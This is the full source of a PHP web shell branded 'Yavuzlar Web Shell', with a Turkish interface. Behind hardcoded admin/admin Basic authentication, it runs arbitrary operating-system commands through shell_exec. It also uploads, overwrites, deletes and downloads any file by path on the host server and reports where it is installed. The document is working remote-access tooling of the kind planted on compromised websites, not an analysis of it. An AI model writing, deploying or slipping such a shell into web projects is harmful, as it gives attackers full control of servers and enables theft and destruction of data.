<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);


$valid_username = 'admin';
$valid_password = 'admin';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] !== $valid_username || $_SERVER['PHP_AUTH_PW'] !== $valid_password) {
    header('WWW-Authenticate: Basic realm="Yavuzlar Web Shell"');
    header('HTTP/1.0 401 Unauthorized');
    echo "Erişim reddedildi.";
    exit;
}


$uploadMessage = $editMessage = $deleteMessage = $cmdMessage = $searchMessage = $permissionsMessage = $downloadMessage = "";


if (isset($_POST['upload']) && isset($_FILES['new_file']) && $_FILES['new_file']['error'] === UPLOAD_ERR_OK) {
    $uploadDir = 'uploads/';
    $uploadFile = $uploadDir . basename($_FILES['new_file']['name']);
    if (move_uploaded_file($_FILES['new_file']['tmp_name'], $uploadFile)) {
        $uploadMessage = "Dosya başarıyla yüklendi!";
    } else {
        $uploadMessage = "Dosya yüklenirken bir hata oluştu.";
    }
}


if (isset($_POST['delete_file']) && isset($_POST['file_path'])) {
    $fileToDelete = $_POST['file_path'];
    if (file_exists($fileToDelete)) {
        unlink($fileToDelete);
        $deleteMessage = "Dosya başarıyla silindi.";
    } else {
        $deleteMessage = "Dosya bulunamadı.";
    }
}


if (isset($_POST['edit_file']) && isset($_POST['file_path']) && isset($_POST['new_content'])) {
    $filePath = $_POST['file_path'];
    $newContent = $_POST['new_content'];
    if (file_exists($filePath)) {
        file_put_contents($filePath, $newContent);
        $editMessage = "Dosya başarıyla düzenlendi.";
    } else {
        $editMessage = "Dosya bulunamadı.";
    }
}


if (isset($_POST['cmd_input'])) {
    $command = $_POST['cmd_input'];
    $output = shell_exec($command);
    $cmdMessage = "<pre><xmp>$output</xmp></pre>";
}


if (isset($_POST['search_term'])) {
    $searchTerm = $_POST['search_term'];
    $files = scandir('.');
    $matches = [];
    foreach ($files as $file) {
        if (strpos($file, $searchTerm) !== false) {
            $matches[] = $file;
        }
    }
    $searchMessage = "Bulunan dosyalar: " . implode(', ', $matches);
}


if (isset($_POST['download_file']) && isset($_POST['download_path'])) {
    $fileToDownload = $_POST['download_path'];
    if (file_exists($fileToDownload)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        readfile($fileToDownload);
        exit;
    } else {
        $downloadMessage = "Dosya bulunamadı.";
    }
}


if (isset($_POST['file_permissions']) && isset($_POST['file_path_permissions'])) {
    $filePath = $_POST['file_path_permissions'];
    if (file_exists($filePath)) {
        $permissionsMessage = "Dosya İzinleri: " . substr(sprintf('%o', fileperms($filePath)), -4);
    } else {
        $permissionsMessage = "Dosya bulunamadı.";
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Web Shell</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #121212; color: #ffffff; margin: 0; padding: 0; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 20px; color: lime; }
        .header img { width: 400px; height: auto; }
        .menu-bar { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
        .menu-bar button { background-color: #444; color: #d1d1d1; padding: 12px 25px; border: 2px solid #444; cursor: pointer; border-radius: 5px; font-size: 16px; }
        .menu-bar button:hover { background-color: #66cc66; border-color: #66cc66; }
        .section { background-color: #222; padding: 20px; border-radius: 10px; margin-bottom: 20px; display: none; }
        .command-box { width: 100%; background-color: #333; color: #d1d1d1; padding: 12px; border: 1px solid #444; border-radius: 5px; }
        .button { padding: 10px 20px; background-color: #444; color: white; border: none; cursor: pointer; border-radius: 5px; }
        .button:hover { background-color: #66cc66; }
        .footer { text-align: center; color: #888; font-size: 14px; padding-top: 20px; }
        .message { margin-top: 10px; color: lime; }
        .result { margin-top: 20px; padding: 10px; background-color: #333; border-radius: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
    <img src="logo.png" alt="Logo">
 
        <h1>Yavuzlar Web Shell</h1>
    </div>
    <center><?php echo "Yüklenen Shell Lokasyonu: ". getcwd();?></center>
    <br> <br>
    <div class="menu-bar">
        <button onclick="toggleSection('help-section')">Yardım</button>
        <button onclick="toggleSection('upload-section')">Dosya Yükle</button>
        <button onclick="toggleSection('edit-section')">Dosya Düzenle</button>
        <button onclick="toggleSection('delete-section')">Dosya Sil</button>
        <button onclick="toggleSection('search-section')">Dosya Ara</button>
        <button onclick="toggleSection('permissions-section')">İzinler</button>
        <button onclick="toggleSection('cmd-section')">Komut Çalıştır</button>
        <button onclick="toggleSection('download-section')">Dosya İndir</button>
       
    </div>

    
    <div id="help-section" class="section" >
        <h3>Yardım</h3>
        <p style="color:rgb(0, 255, 0)">Bu sayfada; <br>
            Dosya Yükleme, <br>Düzenleme, <br>Silme, <br>Arama, <br>İzinleri Gösterme, <br>Komut Çalıştırma ve Dosya İndirme İşlemleri Yapabilirsiniz.</p>
    </div>

    
    <div id="upload-section" class="section">
        <h3>Dosya Yükle</h3>
        <form id="uploadForm" enctype="multipart/form-data" method="POST">
            <input type="file" name="new_file" class="command-box">
            <br>  <br> <input type="submit" name="upload" value="Yükle" class="button">
        </form>
        <?php if ($uploadMessage) { echo "<div class='message'>$uploadMessage</div>"; } ?>
    </div>

    
    <div id="edit-section" class="section">
        <h3>Dosya Düzenle</h3>
        <form id="editForm" method="POST">
            <input type="text" name="file_path" placeholder="Dosya yolunu girin" class="command-box">
            <textarea name="new_content" placeholder="Yeni içeriği girin" class="command-box"></textarea>
            <br>  <br>  <input type="submit" name="edit_file" value="Düzenle" class="button">
        </form>
        <?php if ($editMessage) { echo "<div class='message'>$editMessage</div>"; } ?>
    </div>

 
    <div id="delete-section" class="section">
        <h3>Dosya Sil</h3>
        <form id="deleteForm" method="POST">
            <input type="text" name="file_path" placeholder="Silinecek dosya yolunu girin" class="command-box">
            <br>  <br> <input type="submit" name="delete_file" value="Sil" class="button">
        </form>
        <?php if ($deleteMessage) { echo "<div class='message'>$deleteMessage</div>"; } ?>
    </div>

  
    <div id="cmd-section" class="section">
        <h3>Komut Çalıştır</h3>
        <form id="cmdForm" method="POST">
            <input type="text" name="cmd_input" placeholder="Komutu girin" class="command-box">
         <br>  <br> <input type="submit" value="Çalıştır" class="button">
        </form>
        <?php if ($cmdMessage) { echo "<div class='message'>$cmdMessage</div>"; } ?>
    </div>

    
    <div id="search-section" class="section">
        <h3>Dosya Ara</h3>
        <form id="searchForm" method="POST">
            <input type="text" name="search_term" placeholder="Aranacak terimi girin" class="command-box">
            <br>  <br> <input type="submit" value="Ara" class="button">
        </form>
        <?php if ($searchMessage) { echo "<div class='message'>$searchMessage</div>"; } ?>
    </div>

    
    <div id="download-section" class="section">
        <h3>Dosya İndir</h3>
        <form id="downloadForm" method="POST">
            <input type="text" name="download_path" placeholder="İndirilecek dosya yolunu girin" class="command-box">
            <br>  <br>    <input type="submit" name="download_file" value="İndir" class="button">
        </form>
        <?php if ($downloadMessage) { echo "<div class='message'>$downloadMessage</div>"; } ?>
    </div>

  
    <div id="permissions-section" class="section">
        <h3>Dosya İzinleri</h3>
        <form id="permissionsForm" method="POST">
            <input type="text" name="file_path_permissions" placeholder="Dosya yolunu girin" class="command-box">
            <br>  <br> <input type="submit" name="file_permissions" value="İzinleri Görüntüle" class="button">
        </form>
        <?php if ($permissionsMessage) { echo "<div class='message'>$permissionsMessage</div>"; } ?>
    </div>

    <div class="footer">
        <p>Tüm Hakları Yavuzlar Tarafından Saklıdır.</p>
    </div>
</div>

<script>
    function toggleSection(sectionId) {
        var sections = document.querySelectorAll('.section');
        sections.forEach(function(section) {
            section.style.display = 'none';
        });
        document.getElementById(sectionId).style.display = 'block';
    }
</script>

</body>
</html>
